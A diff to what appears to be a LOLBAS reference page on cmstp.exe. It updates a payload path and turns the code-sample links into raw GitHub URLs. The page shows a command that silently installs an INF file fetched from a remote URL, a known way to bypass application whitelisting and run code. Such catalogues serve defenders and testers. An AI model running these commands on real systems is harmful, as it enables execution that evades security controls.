@@ -5,7 +5,7 @@
 ```
 cmstp.exe /ni /s c:\cmstp\CorpVPN.inf     
 
-cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payloads/Cmstp.inf     
+cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf     
 ```
 
 Acknowledgements:
@@ -13,8 +13,8 @@ Acknowledgements:
 * Nick Tyrer - @NickTyrer
 
 Code sample:
-* [Cmstp.inf](Payloads/Cmstp.inf)    
-* [Cmstp_calc.sct](Payloads/Cmstp_calc.sct)
+* [Cmstp.inf](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf)    
+* [Cmstp_calc.sct](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp_calc.sct)
 
 Resources:
 * https://twitter.com/NickTyrer/status/958450014111633408    
